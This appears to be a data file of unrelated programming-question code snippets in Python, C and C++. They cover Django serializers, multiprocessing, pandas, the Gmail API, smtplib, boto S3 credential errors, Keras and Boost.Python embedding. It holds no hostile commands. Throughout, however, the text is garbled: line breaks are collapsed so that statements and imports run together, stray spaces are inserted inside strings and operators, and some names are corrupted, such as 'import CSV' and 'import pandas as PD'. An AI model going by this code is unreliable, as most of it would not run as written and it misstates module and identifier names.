`` , key_name.lower ( ) )"
$ add-apt-repository ppa : user/ppa-name import aptcache = apt.Cache ( ) # ? ? add the ppa here ? ? cache.update ( ) cache.open ( None ) cache [ 'package_from_ppa ' ] .mark_install ( ) cache.upgrade ( ) cache.commit ( )
"servicenumber | meternumber | usagedatetime | usage11111 | 22222 | 2019-01-01 | 1.8511111 | 22222 | 2019-01-02 | 2.2511111 | 22222 | 2019-01-03 | 1.5511111 | 22222 | 2019-01-04 | 2.1511111 | 33333 | 2019-02-01 | 2.9511111 | 33333 | 2019-02-02 | 3.9511111 | 33333 | 2019-02-03 | 2.0511111 | 33333 | 2019-02-04 | 3.22 class MeterUsage ( models.Model ) : objectid = models.IntegerField ( db_column='OBJECTID ' , unique=True , primary_key=True ) servicenumber = models.IntegerField ( db_column='serviceNumber ' , blank=True , null=True ) meternumber = models.IntegerField ( db_column='meterNumber ' , blank=True , null=True ) usagedatetime = models.DateTimeField ( db_column='usageDateTime ' , blank=True , null=True ) usage = models.DecimalField ( max_digits=38 , decimal_places=8 , blank=True , null=True ) class MeterUsageSerializer ( serializers.ModelSerializer ) : class Meta : model = MeterUsage fields = ( 'usagedatetime ' , 'usage ' ) [ { `` usagedatetime '' : `` 2019-01-01 '' , `` usage '' : `` 1.85 '' } , { `` usagedatetime '' : `` 2019-01-02 '' , `` usage '' : `` 2.25 '' } , { `` usagedatetime '' : `` 2019-01-03 '' , `` usage '' : `` 1.55 '' } , ... . ] [ { `` servicenumber '' : `` 11111 '' , `` meternumber '' : `` 22222 '' , `` usagedata '' : [ { `` usagedatetime '' : `` 2019-01-01 '' , `` usage '' : `` 1.85 '' } , { `` usagedatetime '' : `` 2019-01-02 '' , `` usage '' : `` 2.25 '' } , { `` usagedatetime '' : `` 2019-01-03 '' , `` usage '' : `` 1.55 '' } , { `` usagedatetime '' : `` 2019-01-04 '' , `` usage '' : `` 2.15 '' } , ... ] } , { `` servicenumber '' : `` 11111 '' , `` meternumber '' : `` 33333 '' , `` usagedata '' : [ { `` usagedatetime '' : `` 2019-02-01 '' , `` usage '' : `` 2.95 '' } , { `` usagedatetime '' : `` 2019-02-02 '' , `` usage '' : `` 3.95 '' } , { `` usagedatetime '' : `` 2019-02-03 '' , `` usage '' : `` 2.05 '' } , { `` usagedatetime '' : `` 2019-02-04 '' , `` usage '' : `` 3.22 '' } , ... ] } , ... ] chartData = [ { label : '22222 ' , data : [ 1.85 , 2.25 , 1.55 , 2.15 ] } , { label : '33333 ' , data : [ 2.95 , 3.95 , 2.05 , 3.22 ] } ] ;"
"from glob import globimport os , timeimport sysimport CSVimport reimport subprocessimport pandas as PDimport pypyodbcfrom multiprocessing import Process , Queue , current_process , freeze_support # # Function run by worker processes # def worker ( input , output ) : for func , args in iter ( input.get , 'STOP ' ) : result = compute ( func , args ) output.put ( result ) # # Function used to compute result # def compute ( func , args ) : result = func ( args ) return ' % s says that % s % s = % s ' % \ ( current_process ( ) .name , func.__name__ , args , result ) def query_sql ( sql_file ) : # test func # jsl file processing and SQL querying , data table will be saved to csv . fo_name = os.path.splitext ( sql_file ) [ 0 ] + '.csv ' fo = open ( fo_name , ' w ' ) print sql_file fo.write ( `` sql_file { 0 } is done\n '' .format ( sql_file ) ) return `` Query is done for \n '' .format ( sql_file ) def check_files ( path ) : `` '' '' arguments -- root path to monitor returns -- dictionary of { file : timestamp , ... } `` '' '' sql_query_dirs = glob ( path + `` /*/IDABox/ '' ) files_dict = { } for sql_query_dir in sql_query_dirs : for root , dirs , filenames in os.walk ( sql_query_dir ) : [ files_dict.update ( { ( root + filename ) : os.path.getmtime ( root + filename ) } ) for filename in filenames if filename.endswith ( '.jsl ' ) ] return files_dict # # # # # working in single threaddef single_thread ( ) : path = `` Y : / '' before = check_files ( path ) sql_queue = [ ] while True : time.sleep ( 3 ) after = check_files ( path ) added = [ f for f in after if not f in before ] deleted = [ f for f in before if not f in after ] overlapped = list ( set ( list ( after ) ) & set ( list ( before ) ) ) updated = [ f for f in overlapped if before [ f ] < after [ f ] ] before = after sql_queue = added + updated # print sql_queue for sql_file in sql_queue : try : query_sql ( sql_file ) except : pass # # # # # not working in queuedef multiple_thread ( ) : NUMBER_OF_PROCESSES = 4 path = `` Y : / '' sql_queue = [ ] before = check_files ( path ) # get the current dictionary of sql_files task_queue = Queue ( ) done_queue = Queue ( ) while True : # while loop to check the changes of the files time.sleep ( 5 ) after = check_files ( path ) added = [ f for f in after if not f in before ] deleted = [ f for f in before if not f in after ] overlapped = list ( set ( list ( after ) ) & set ( list ( before ) ) ) updated = [ f for f in overlapped if before [ f ] < after [ f ] ] before = after sql_queue = added + updated TASKS = [ ( query_sql , sql_file ) for sql_file in sql_queue ] # Create queues # submit task for task in TASKS : task_queue.put ( task ) for i in range ( NUMBER_OF_PROCESSES ) : p = Process ( target=worker , args= ( task_queue , done_queue ) ) .start ( ) # try : # p = Process ( target=worker , args= ( task_queue ) ) # p.start ( ) # except : # pass # Get and print results print 'Unordered results : ' for i in range ( len ( TASKS ) ) : print '\t ' , done_queue.get ( ) # Tell child processes to stop for i in range ( NUMBER_OF_PROCESSES ) : task_queue.put ( 'STOP ' ) # single_thread ( ) if __name__ == '__main__ ' : # freeze_support ( ) multiple_thread ( )"
"df [ 'type ' ] = np.where ( df [ 'food ' ] in [ 'apple ' , 'banana ' , 'kiwi ' ] , 'fruit ' , 'oth . food ' ) ValueError : The truth value of a Series is ambiguous . Use a.empty , a.bool ( ) , a.item ( ) , a.any ( ) or a.all ( ) ."
"import base64import osimport httplib2import oauth2clientfrom oauth2client import clientfrom oauth2client import toolsfrom email.mime.text import MIMETextfrom email.mime.multipart import MIMEMultipartfrom pathlib import Pathfrom apiclient import errorsfrom apiclient import discoverySCOPES = 'https : //mail.google.com/'CLIENT_SECRET_FILE = 'client_id.json'APPLICATION_NAME = 'Test Client'def get_credentials ( ) : home_dir = os.path.expanduser ( '~ ' ) credential_dir = os.path.join ( home_dir , '.credentials ' ) if not os.path.exists ( credential_dir ) : os.makedirs ( credential_dir ) credential_path = os.path.join ( credential_dir , 'gmail-python-quickstart.json ' ) store = oauth2client.file.Storage ( credential_path ) credentials = store.get ( ) if not credentials or credentials.invalid : flow = client.flow_from_clientsecrets ( CLIENT_SECRET_FILE , SCOPES ) flow.user_agent = APPLICATION_NAME if flags : credentials = tools.run_flow ( flow , store , flags ) else : # Needed only for compatibility with Python 2.6 credentials = tools.run ( flow , store ) print ( 'Storing credentials to ' + credential_path ) return credentialsdef CreateDraft ( service , user_id , message_body ) : message = { 'message ' : message_body } draft = service.users ( ) .drafts ( ) .create ( userId=user_id , body=message ) .execute ( ) return draftdef CreateTestMessage ( sender , to , subject ) : msg = MIMEMultipart ( 'alternative ' ) msg [ 'Subject ' ] = subject msg [ 'From ' ] = sender msg [ 'To ' ] = to plain_text = `` Text email message . It 's plain . It 's text . '' html_text = `` '' '' \ < html > < head > < /head > < body > < p > HTML email message < /p > < ol > < li > As easy as one < /li > < li > two < /li > < li > three ! < /li > < /ol > < p > Includes < a href= '' http : //stackoverflow.com/ '' > linktacular < /a > goodness < /p > < /body > < /html > '' '' '' # Swapping the following two lines results in Gmail generating HTML # based on plaintext , as opposed to generating plaintext based on HTML msg.attach ( MIMEText ( plain_text , 'plain ' ) ) msg.attach ( MIMEText ( html_text , 'html ' ) ) print ( ' -- -- -\nHere is the message : \n\n { m } '.format ( m=msg ) ) encoded = base64.urlsafe_b64encode ( msg.as_string ( ) .encode ( 'UTF-8 ' ) ) .decode ( 'UTF-8 ' ) return { 'raw ' : encoded } def main ( ) : credentials = get_credentials ( ) http = credentials.authorize ( httplib2.Http ( ) ) service = discovery.build ( 'gmail ' , 'v1 ' , http=http ) my_address = 'example @ gmail.com ' # Obscured to protect the culpable test_message = CreateTestMessage ( sender=my_address , to='example @ gmail.com ' , subject='Subject line Here ' ) draft = CreateDraft ( service , my_address , test_message ) if __name__ == '__main__ ' : main ( )"
"raw_data = [ 1. , 2. , 8. , -1. , 0. , 5.5 , 6. , 13 ] spike = tf.Variable ( False ) spike.initializer.run ( ) for i in range ( 1 , len ( raw_data ) ) : if raw_data [ i ] - raw_data [ i-1 ] > 5 : updater = tf.assign ( spike , True ) updater.eval ( ) else : tf.assign ( spike , False ) .eval ( ) print ( `` Spike '' , spike.eval ( ) ) sess.close ( )"
A = 1 B = 1 C data 0 1 1 2A = 1 B = 2 C data 1 3 2 4A = 2 B = 1 C data 0 5 2 6 A B C data1 1 0 1 1 21 2 1 3 2 42 1 0 5 2 6
"> > > x = numpy.array ( [ [ 1 , 2 ] , ... [ 3 , 4 ] , ... [ 5 , 6 ] ] ) > > > [ 1 , 7 ] in xTrue > > > [ 1 , 2 ] in xTrue > > > [ 1 , 6 ] in xTrue > > > [ 2 , 6 ] in xTrue > > > [ 3 , 6 ] in xTrue > > > [ 2 , 3 ] in xFalse > > > [ 2 , 1 ] in xFalse > > > [ 1 , 2 , 3 ] in xFalse > > > [ 1 , 3 , 5 ] in xFalse"
"import sys , smtplibfromaddr = raw_input ( `` From : `` ) toaddr = string.splitfields ( raw_input ( `` To : `` ) , ' , ' ) print `` Enter message , end with ^D : '' msg = `` while 1 : line = sys.stdin.readline ( ) if not line : break msg = msg + line # The actual mail sendserver = smtplib.SMTP ( 'localhost ' ) server.sendmail ( fromaddr , toaddrs , msg ) server.quit ( ) fromaddr = raw_input ( `` From : `` ) toaddr = string.splitfields ( raw_input ( `` To : brilliant @ yahoo.com '' ) , ' , ' ) msg = 'Cats can not fly ! '"
"model = pandas.ols ( y = realizedData , x = pastData , intercept = 0 , window_type= '' rolling '' , window = 80 , min_periods = 80 )"
"with open ( `` input.txt '' , ' r ' ) as f : for line in f : # do your stuff with open ( `` input.txt '' , ' r+ ' ) as file : for line in file : print line.rstrip ( `` \n\r '' ) # for debug if line.rstrip ( `` \n\r '' ) == '' CC '' : print `` truncating ! '' # for debug file.truncate ( ) ; break ; AACCDD AACCtruncating ! AACC"
"def task ( ) : print `` task called '' a = taskclass A : func = task # this show error unbound method # func = task.__call__ # if i replace with this work def __init__ ( self ) : self.func_1 = task def test_1 ( self ) : self.func_1 ( ) @ classmethod def test ( cls ) : cls.func ( ) a ( ) A ( ) .test_1 ( ) A.test ( ) task calledtask calledTraceback ( most recent call last ) : File `` a.py '' , line 26 , in < module > A.test ( ) File `` a.py '' , line 21 , in test cls.func ( ) TypeError : unbound method task ( ) must be called with A instance as first argument ( got nothing instead )"
> > > str ( 1.0/7 ) [ :50 ] ' 0.142857142857 '
"url ( r'^create ' , GenericCreate ( model=Author ) .as_view ( ) , name='create ' ) , class GenericCreate ( CreateView ) : def __init__ ( self , model , *args , **kwargs ) : super ( GenericCreate , self ) .__init__ ( *args , **kwargs ) self.form_class = to_modelform ( self.model )"
"# include < unistd.h > # include < sys/time.h > # define L ( 100*1024 ) char s [ L+1024 ] ; char c [ 2*L+1024 ] ; double time_diff ( struct timeval et , struct timeval st ) { return 1e-6* ( ( et.tv_sec - st.tv_sec ) *1000000 + ( et.tv_usec - st.tv_usec ) ) ; } int foo ( ) { strcpy ( c , s ) ; strcat ( c+L , s ) ; return 0 ; } int main ( ) { struct timeval st ; struct timeval et ; int i ; //printf ( `` s : % x\nc : % x\n '' , s , c ) ; //printf ( `` s= % d c= % d\n '' , strlen ( s ) , strlen ( c ) ) ; memset ( s , ' 1 ' , L ) ; //printf ( `` s= % d c= % d\n '' , strlen ( s ) , strlen ( c ) ) ; foo ( ) ; //printf ( `` s= % d c= % d\n '' , strlen ( s ) , strlen ( c ) ) ; //s [ 1024*100-1 ] =0 ; gettimeofday ( & st , NULL ) ; for ( i = 0 ; i < 1000 ; i++ ) foo ( ) ; gettimeofday ( & et , NULL ) ; printf ( `` % f\n '' , time_diff ( et , st ) ) ; return 0 ; } import times = ' 1'*102400def foo ( ) : c = s + s # assert ( len ( c ) == 204800 ) st = time.time ( ) for x in xrange ( 1000 ) : foo ( ) et = time.time ( ) print ( et-st ) root @ xkqeacwf : ~/lab/wfaster # python cp100k.py 0.027932882309root @ xkqeacwf : ~/lab/wfaster # gcc cp100k.croot @ xkqeacwf : ~/lab/wfaster # ./a.out 0.061820"
"formula = `` ( ( [ foo ] + [ bar ] ) - ( [ baz ] /2 ) ) '' function_mapping = { `` foo '' : FooFunction , `` bar '' : BarFunction , `` baz '' : BazFunction , } converted_formula = ( ( FooFunction ( ) + BarFunction ( ) - ( BazFunction ( ) /2 ) ) In [ 11 ] : ast = compiler.parse ( formula ) In [ 12 ] : astOut [ 12 ] : Module ( None , Stmt ( [ Discard ( Sub ( ( Add ( ( List ( [ Name ( 'foo ' ) ] ) , List ( [ Name ( 'bar ' ) ] ) ) ) , Div ( ( List ( [ Name ( 'baz ' ) ] ) , Const ( 2 ) ) ) ) ) ) ] ) )"
"import tarfiletar = tarfile.open ( `` my_archive.tar.gz '' ) ) , `` w|gz '' ) tar.add ( 'huge_file.sql ' ) tar.close ( )"
"docker run -it -- rm python:3.4-slim /bin/bash root @ dab02ca9c61d : ~ # apt-get update & & apt-get install nano root @ dab02ca9c61d : ~ # pip install boto [ Credentials ] aws_access_key_id = some_long_stringaws_secret_access_key = another_bigger_string [ Boto ] debug = 2num_retries = 10 root @ dab02ca9c61d : ~ # python -VPython 3.4.4root @ dab02ca9c61d : ~ # pip listboto ( 2.38.0 ) pip ( 7.1.2 ) setuptools ( 18.2 ) root @ dab02ca9c61d : ~ # root @ dab02ca9c61d : ~ # pythonPython 3.4.4 ( default , Jan 8 2016 , 00:24:55 ) [ GCC 4.9.2 ] on linuxType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > import boto > > > boto.connect_s3 ( ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /usr/local/lib/python3.4/site-packages/boto/__init__.py '' , line 141 , in connect_s3 return S3Connection ( aws_access_key_id , aws_secret_access_key , **kwargs ) File `` /usr/local/lib/python3.4/site-packages/boto/s3/connection.py '' , line 190 , in __init__ validate_certs=validate_certs , profile_name=profile_name ) File `` /usr/local/lib/python3.4/site-packages/boto/connection.py '' , line 569 , in __init__ host , config , self.provider , self._required_auth_capability ( ) ) File `` /usr/local/lib/python3.4/site-packages/boto/auth.py '' , line 987 , in get_auth_handler 'Check your credentials ' % ( len ( names ) , str ( names ) ) ) boto.exception.NoAuthHandlerFound : No handler was ready to authenticate . 1 handlers were checked . [ 'HmacAuthV1Handler ' ] Check your credentials > > > > > > boto.set_stream_logger ( 'boto ' ) > > > boto.connect_s3 ( ) 2016-01-11 01:53:23,577 boto [ DEBUG ] : Using access key found in config file.2016-01-11 01:53:23,577 boto [ DEBUG ] : Using secret key found in config file.2016-01-11 01:53:23,577 boto [ DEBUG ] : Retrieving credentials from metadata server. -- - Logging error -- -Traceback ( most recent call last ) : File `` /usr/local/lib/python3.4/logging/__init__.py '' , line 978 , in emit msg = self.format ( record ) File `` /usr/local/lib/python3.4/logging/__init__.py '' , line 828 , in format return fmt.format ( record ) File `` /usr/local/lib/python3.4/logging/__init__.py '' , line 573 , in format record.exc_text = self.formatException ( record.exc_info ) File `` /usr/local/lib/python3.4/logging/__init__.py '' , line 523 , in formatException traceback.print_exception ( ei [ 0 ] , ei [ 1 ] , tb , None , sio ) File `` /usr/local/lib/python3.4/traceback.py '' , line 169 , in print_exception for line in _format_exception_iter ( etype , value , tb , limit , chain ) : File `` /usr/local/lib/python3.4/traceback.py '' , line 146 , in _format_exception_iter for value , tb in values : File `` /usr/local/lib/python3.4/traceback.py '' , line 125 , in _iter_chain context = exc.__context__AttributeError : 'NoneType ' object has no attribute '__context__'Call stack : File `` < stdin > '' , line 1 , in < module > File `` /usr/local/lib/python3.4/site-packages/boto/__init__.py '' , line 141 , in connect_s3 return S3Connection ( aws_access_key_id , aws_secret_access_key , **kwargs ) File `` /usr/local/lib/python3.4/site-packages/boto/s3/connection.py '' , line 190 , in __init__ validate_certs=validate_certs , profile_name=profile_name ) File `` /usr/local/lib/python3.4/site-packages/boto/connection.py '' , line 555 , in __init__ profile_name ) File `` /usr/local/lib/python3.4/site-packages/boto/provider.py '' , line 200 , in __init__ self.get_credentials ( access_key , secret_key , security_token , profile_name ) File `` /usr/local/lib/python3.4/site-packages/boto/provider.py '' , line 376 , in get_credentials self._populate_keys_from_metadata_server ( ) File `` /usr/local/lib/python3.4/site-packages/boto/provider.py '' , line 391 , in _populate_keys_from_metadata_server data='meta-data/iam/security-credentials/ ' ) File `` /usr/local/lib/python3.4/site-packages/boto/utils.py '' , line 394 , in get_instance_metadata return _get_instance_metadata ( metadata_url , num_retries=num_retries , timeout=timeout ) File `` /usr/local/lib/python3.4/site-packages/boto/utils.py '' , line 234 , in _get_instance_metadata return LazyLoadMetadata ( url , num_retries , timeout ) File `` /usr/local/lib/python3.4/site-packages/boto/utils.py '' , line 244 , in __init__ data = boto.utils.retry_url ( self._url , num_retries=self._num_retries , timeout=self._timeout ) File `` /usr/local/lib/python3.4/site-packages/boto/utils.py '' , line 224 , in retry_url boto.log.exception ( 'Caught exception reading instance data ' ) Message : 'Caught exception reading instance data'Arguments : ( ) 2016-01-11 01:53:24,582 boto [ ERROR ] : Unable to read instance data , giving upTraceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /usr/local/lib/python3.4/site-packages/boto/__init__.py '' , line 141 , in connect_s3 return S3Connection ( aws_access_key_id , aws_secret_access_key , **kwargs ) File `` /usr/local/lib/python3.4/site-packages/boto/s3/connection.py '' , line 190 , in __init__ validate_certs=validate_certs , profile_name=profile_name ) File `` /usr/local/lib/python3.4/site-packages/boto/connection.py '' , line 569 , in __init__ host , config , self.provider , self._required_auth_capability ( ) ) File `` /usr/local/lib/python3.4/site-packages/boto/auth.py '' , line 987 , in get_auth_handler 'Check your credentials ' % ( len ( names ) , str ( names ) ) ) boto.exception.NoAuthHandlerFound : No handler was ready to authenticate . 1 handlers were checked . [ 'HmacAuthV1Handler ' ] Check your credentials > > > > > > boto.config.sections ( ) [ 'Credentials ' , 'Boto ' ] > > > boto.config.get_value ( 'Credentials ' , 'aws_access_key_id ' ) > > > > > > import configparser > > > config = configparser.ConfigParser ( ) > > > config.read ( '~/.boto ' ) [ ] > > > config.read ( '/root.boto ' ) [ '/root/.boto ' ] > > > config.get ( 'Credentials ' , 'aws_access_key_id ' ) 'some_long_string ' > > > > > boto.connect_s3 ( 'some_long_string ' , 'another_bigger_string ' ) 2016-01-11 02:05:33,636 boto [ DEBUG ] : Using access key provided by client.2016-01-11 02:05:33,636 boto [ DEBUG ] : Using secret key provided by client.S3Connection : s3.amazonaws.com > > >"
"data = { 'ac ' : [ ' a ' , ' a ' , ' a ' , ' a ' , ' a ' , ' a ' , ' a ' , ' a ' , ' b ' , ' b ' , ' b ' , ' b ' , ' b ' ] , 'cls ' [ 'wwww ' , 'wwww ' , 'wwww ' , 'xxxx ' , 'xxxx ' , 'zzzz ' , 'zzzz ' , 'yyyy ' , 'wwww ' , 'xxxx ' , 'zzzz ' , 'zzzz ' , 'yyyy ' ] , 'pl ' : [ 1,1,1,1,1,1,1,1,1,1,1,1,1 ] } df = pd.DataFrame ( data ) grouped = df.groupby ( [ 'ac ' , 'cls ' ] ) .agg ( { 'pl ' : np.sum } ) pl ac cls a wwww 3 xxxx 2 yyyy 1 zzzz 2 b wwww 1 xxxx 1 yyyy 1 zzzz 2 pl ac cls a wwww 3 a xxxx 2 a yyyy 1 a zzzz 2 b wwww 1 b xxxx 1 b yyyy 1 b zzzz 2"
"array ( [ 1 , 2 , 1 , 1 , 2 ] ) array ( [ 2 , 1 , 1 , 1 , 1 ] ) > > > np.array ( [ a , b ] ) .Tarray ( [ [ 1 , 2 ] , [ 2 , 1 ] , [ 1 , 1 ] , [ 1 , 1 ] , [ 2 , 1 ] ] ) array ( [ [ 0 , 0 , 0 ] , [ 0 , 2 , 1 ] , # ( 1,1 ) twice , ( 1,2 ) once [ 0 , 2 , 0 ] ] ) # ( 2,1 ) twice"
"def keras_model ( n_classes=None , model_dir='./tmp-model/ ' , config=None ) : with tf.device ( '/gpu:0 ' ) : # Inputs inp_raw = Input ( shape= ( max_len , ) , name='word_raw ' ) # raw text LSTM network word_raw_emb = Embedding ( input_dim=nunique_chars_raw , output_dim=EMBED_SIZE , input_length=MAX_WORD_LENGTH , trainable=True , name='word_raw_emb ' ) ( inp_raw ) word_raw_emb = Dropout ( rate=dropout_rate ) ( word_raw_emb ) word_raw_emb_lstm = Bidirectional ( LSTM ( 48 , return_sequences=True ) ) ( word_raw_emb ) word_raw_emb_gru = Bidirectional ( GRU ( 48 , return_sequences=False ) ) ( word_raw_emb_lstm ) word_raw_net = Dense ( 16 , activation='relu ' ) ( word_raw_emb_gru ) output_raw_net = Dense ( n_classes , activation='softmax ' ) ( word_raw_net ) model = Model ( inputs=inp_raw , outputs=output_raw_net ) optz = keras.optimizers.RMSprop ( lr=0.002 , rho=0.9 , epsilon=None , decay=0.0 ) model.compile ( loss='categorical_crossentropy ' , optimizer=optz , metrics= [ 'categorical_accuracy ' ] ) return modelmodel = keras_model ( 5 ) model.fit ( train_X , train_Y_onehot , batch_size=128 , epochs=10 , validation_data= ( eval_X , eval_Y_onehot ) , class_weight=class_weights , verbose=1 ) def keras_estimator_model ( n_classes=None , model_dir='./tmp-model/ ' , config=None ) : with tf.device ( '/gpu:0 ' ) : # Inputs inp_raw = Input ( shape= ( max_len , ) , name='word_raw ' ) # raw text LSTM network word_raw_emb = Embedding ( input_dim=nunique_chars_raw , output_dim=EMBED_SIZE , input_length=MAX_WORD_LENGTH , trainable=True , name='word_raw_emb ' ) ( inp_raw ) word_raw_emb = Dropout ( rate=dropout_rate ) ( word_raw_emb ) word_raw_emb_lstm = Bidirectional ( LSTM ( 48 , return_sequences=True ) ) ( word_raw_emb ) word_raw_emb_gru = Bidirectional ( GRU ( 48 , return_sequences=False ) ) ( word_raw_emb_lstm ) word_raw_net = Dense ( 16 , activation='relu ' ) ( word_raw_emb_gru ) output_raw_net = Dense ( n_classes , activation='softmax ' ) ( word_raw_net ) model = Model ( inputs=inp_raw , outputs=output_raw_net ) optz = keras.optimizers.RMSprop ( lr=0.002 , rho=0.9 , epsilon=None , decay=0.0 ) model.compile ( loss='categorical_crossentropy ' , optimizer=optz , metrics= [ 'categorical_accuracy ' ] ) model_estimator = model_to_estimator ( keras_model=model , model_dir=model_dir , config=config ) return model_estimatorestimator_model = keras_estimator_model ( 5 ) train_spec = tf.estimator.TrainSpec ( input_fn=train_input_fn , max_steps=10 ) eval_spec = tf.estimator.EvalSpec ( input_fn=eval_input_fn , steps=None , start_delay_secs=10 , throttle_secs=10 ) tf.estimator.train_and_evaluate ( estimator_model , train_spec , eval_spec )"
"f = open ( ... , ... ) f.write ( ) f.close ( ) with open ( location , mode ) as packageFile : packageFile.write ( ) open ( location , mode ) .write ( content ) .close ( ) Traceback ( most recent call last ) : File `` test.py '' , line 20 , in < module > one.save ( `` one.txt '' , sample ) File `` /home/nwp/Desktop/Python/test/src/one.py '' , line 303 , in save open ( location , mode ) .write ( content ) .close ( ) AttributeError : 'int ' object has no attribute 'close ' open ( location , mode ) .write ( content )"
"text = 'CHRIS : Hello , how are you ... PETER : Great , you ? PAM : He is resting . [ PAM SHOWS THE COUCH ] [ PETER IS NODDING HIS HEAD ] CHRIS : Are you ok ? ' ( 'CHRIS ' , 'Hello , how are you ... ' , None ) ( 'PETER ' , 'Great , you ? ' , None ) ( 'PAM ' , 'He is resting ' , 'PAM SHOWS THE COUCH . PETER IS NODDING HIS HEAD ' ) ( 'CHRIS ' , 'Are you ok ? ' , None ) etc ... actors = re.findall ( r'\w+ ( ? =\s* : [ ^/ ] ) ' , text )"
"a = [ 1 , 2 , 3 , 'text ' , 5 ] b = [ ] try : for k in range ( len ( a ) ) : b.append ( a [ k ] + 4 ) except : print ( 'Error ! ' ) print ( b ) Error ! [ 5 , 6 , 7 ] c= [ ] try : c = [ a [ k ] + 4 for k in range ( len ( a ) ) ] except : print ( 'Error ! ' ) print ( c ) Error ! [ ]"
"# it is my package , need to check , call it example.py # We have more than one way to import a package , It is a problem need to consider too from third_party_packages import third_party_function def my_function ( arg ) : return third_party_function ( arg ) result = tool ( example.py ) # this result should be a dict like this structure # { `` third_party_function '' : [ `` my_function '' , ] } # Means `` my_function '' relies on `` third_party_function ''"
"local_forms/├── local_forms│ ├── __init__.py│ ├── models.py│ ├── settings.py│ ├── urls.py│ └── wsgi.py├── manage.py├── my_form.py├── test_form.py from django.db import modelsclass MyModel ( models.Model ) : val=models.DecimalField ( `` value '' , max_digits=11 , decimal_places=2 ) from django import formsfrom django.conf import settingsfrom local_forms.models import MyModelclass MyForm ( forms.ModelForm ) : val = forms.DecimalField ( localize=True ) def __init__ ( self , *args , **kwargs ) : super ( MyForm , self ) .__init__ ( *args , **kwargs ) self.fields [ 'val ' ] .localize=True if __debug__ : print self.fields [ 'val ' ] .localize print ( `` Separator : `` +settings.DECIMAL_SEPARATOR ) print ( `` Language : `` +settings.LANGUAGE_CODE ) class Meta : model=MyModel # ! /usr/bin/env pythonimport osimport sysif __name__ == `` __main__ '' : os.environ.setdefault ( `` DJANGO_SETTINGS_MODULE '' , `` local_forms.settings '' ) import my_form form=my_form.MyForm ( { 'val ' : ' 0,2 ' } ) print ( `` Is bound : % s '' % form.is_bound ) print ( `` Form valid % s '' % form.is_valid ( ) ) print ( `` Errors in val : % s '' % form [ 'val ' ] .errors ) ./test_form.pyTrueSeparator : .Language : de-deIs bound : TrueForm valid TrueErrors in val : In [ 1 ] : import my_form as mfIn [ 2 ] : form=mf.MyForm ( { 'val ' : ' 0,2 ' } ) TrueSeparator : .Language : de-deIn [ 3 ] : form.is_valid ( ) Out [ 3 ] : FalseIn [ 4 ] : form [ 'val ' ] .errorsOut [ 4 ] : [ u'Enter a number . ' ]"
"class Foo ( object ) : def __init__ ( self , x ) : self.x = x class Bar ( Foo ) : @ property def x ( self ) : return super ( ) .x @ x.setter def x ( self , value ) : raise NotImplementedError ( 'Do not change x directly , use `` do_stuff ( ) '' instead ' ) def do_stuff ( self , value ) : if < something > : super ( ) .x = value"
"from functools import reducearr = [ 17 , 2 , 3 , 6 , 1 , 3 , 1 , 9 , 5 , 3 ] sorted_arr = reduce ( lambda a , b : ( b , a ) if a > b else ( a , b ) , arr ) TypeError : ' > ' not supported between instances of 'tuple ' and 'int '"
"namespace bp = boost : :python ; bp : :object import ( const std : :string & module , const std : :string & path , bp : :object & globals ) { bp : :dict locals ; locals [ `` module_name '' ] = module ; locals [ `` path '' ] = path ; bp : :exec ( `` import imp\n '' `` new_module = imp.load_module ( module_name , open ( path ) , path , ( 'py ' , ' U ' , imp.PY_SOURCE ) ) \n '' , globals , locals ) ; return locals [ `` new_module '' ] ; } int main ( ) { Py_Initialize ( ) ; bp : :object main = bp : :import ( `` __main__ '' ) ; bp : :object globals = main.attr ( `` __dict__ '' ) ; bp : :object module = import ( `` test '' , `` test.py '' , globals ) ; bp : :object run = module.attr ( `` run '' ) ; run ( ) ; return 0 ; } def run ( ) : print `` hello world '' hello world struct Foo { void f ( ) { } } ; BOOST_PYTHON_MODULE ( FooModule ) { bp : :class_ < Foo > ( `` Foo '' ) .def ( `` f '' , & Foo : :f ) ; } PyImport_AppendInittab ( `` FooModule '' , & initFooModule ) ; ... bp : :object Foo = bp : :import ( `` FooModule '' ) ; globals [ `` Foo '' ] = Foo ; def run ( ) : foo = Foo ( ) foo.f ( ) # include < iostream > # include < boost/python.hpp > namespace bp = boost : :python ; bp : :object import ( const std : :string & module , const std : :string & path , bp : :object & globals ) { bp : :dict locals ; locals [ `` module_name '' ] = module ; locals [ `` path '' ] = path ; bp : :exec ( `` import imp\n '' `` new_module = imp.load_module ( module_name , open ( path ) , path , ( 'py ' , ' U ' , imp.PY_SOURCE ) ) \n '' , globals , locals ) ; return locals [ `` new_module '' ] ; } struct Foo { void f ( ) { } } ; BOOST_PYTHON_MODULE ( FooModule ) { bp : :class_ < Foo > ( `` Foo '' ) .def ( `` f '' , & Foo : :f ) ; } int main ( ) try { PyImport_AppendInittab ( `` FooModule '' , & initFooModule ) ; Py_Initialize ( ) ; // get a handle to the globals dict bp : :object main = bp : :import ( `` __main__ '' ) ; bp : :object globals = main.attr ( `` __dict__ '' ) ; // import FooModule , and store it in the globals dict bp : :object Foo = bp : :import ( `` FooModule '' ) ; globals [ `` Foo '' ] = Foo ; // import the test script , passing the populated globals dict bp : :object module = import ( `` test '' , `` test.py '' , globals ) ; bp : :object run = module.attr ( `` run '' ) ; // run the script run ( ) ; return 0 ; } catch ( const bp : :error_already_set & ) { std : :cerr < < `` > > > Error ! Uncaught exception : \n '' ; PyErr_Print ( ) ; return 1 ; } > > > Error ! Uncaught exception : Traceback ( most recent call last ) : File `` test.py '' , line 2 , in run foo = Foo ( ) NameError : global name 'Foo ' is not defined"
"def find ( f , seq , index_only=True , item_only=False ) : `` '' '' Return first item in sequence where f ( item ) == True . '' '' '' index = 0 for item in seq : if f ( item ) : if index_only : return index if item_only : return item return index , item index+= 1 raise KeyError"
def solve ( something ) : if exit_condition ( something ) : return next_to_try = stuff_to_try.next ( ) while not if_works ( next_to_try ) : next_to_try = stuff_to_try.next ( ) solve ( do_something ( something ) )
